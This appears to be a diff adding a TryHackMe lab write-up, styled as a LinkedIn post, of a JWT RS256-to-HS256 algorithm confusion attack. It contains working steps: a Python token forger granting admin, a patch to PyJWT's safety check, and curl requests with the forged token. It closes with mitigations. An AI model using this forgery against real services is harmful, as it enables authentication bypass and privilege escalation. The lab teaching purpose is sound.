@@ -1,0 +1,54 @@
+📝 LinkedIn Write-Up: JWT Algorithm Confusion Attack
+
+🔐 JWT Algorithm Confusion Attack — TryHackMe Write-Up
+Practical Example 5: Exploiting RS256 to HS256 Downgrade Vulnerability
+
+🎯 Overview
+Today I successfully exploited a JWT Algorithm Confusion vulnerability — a critical security flaw that occurs when servers trust the algorithm specified in the JWT header without proper validation.
+
+🔍 The Vulnerability
+When a server uses RS256 (asymmetric encryption) but doesn't enforce the algorithm, attackers can:
+1. Change the algorithm to HS256 (symmetric)
+2. Sign the token with the public key (which is... public!)
+3. The server verifies using the same public key
+4. Signature matches → Access granted!
+
+🛠️ Exploitation Steps
+Step 1: Obtained JWT token and public key
+bash
+
+curl -H 'Content-Type: application/json' -X POST \  -d '{"username":"user","password":"password5"}' \  http://TARGET/api/v1.0/example5
+Step 2: Created Python script to forge malicious token
+python
+
+import jwtpublic_key = """-----BEGIN PUBLIC KEY-----[PUBLIC_KEY_HERE]-----END PUBLIC KEY-----"""payload = {    'username': 'user',    'admin': 1  # Privilege escalation!}token = jwt.encode(payload, public_key, algorithm="HS256")print(token)
+Step 3: Bypassed PyJWT security check
+bash
+
+sudo nano /usr/lib/python3/dist-packages/jwt/algorithms.py# Commented lines 143-146
+Step 4: Executed attack
+bash
+
+curl -H 'Authorization: Bearer [FORGED_TOKEN]' \  'http://TARGET/api/v1.0/example5?username=admin'
+Result: 🚩 THM{f592dfe2-ec65-4514-a135-70ba358f22c4}
+
+🧠 Key Takeaways
+
+Vulnerability	Impact	Mitigation
+Algorithm not enforced server-side	Complete authentication bypass	Hardcode allowed algorithms
+Public key exposure	Enables token forgery	Use asymmetric algorithms properly
+Trust in JWT header	Privilege escalation	Never trust client input
+🛡️ Secure Implementation
+python
+
+# ❌ VULNERABLEjwt.decode(token, public_key, algorithms=[header['alg']])# ✅ SECUREjwt.decode(token, public_key, algorithms=['RS256'])
+
+💡 Lessons Learned
+
+Never trust the algorithm claim in JWT headers!
+When implementing JWT authentication, always:
+* Explicitly specify allowed algorithms server-side
+* Use separate key pairs for different algorithms
+* Implement proper key management
+
+#cybersecurity #penetrationtesting #jwt #websecurity #ethicalhacking #tryhackme #infosec #appse
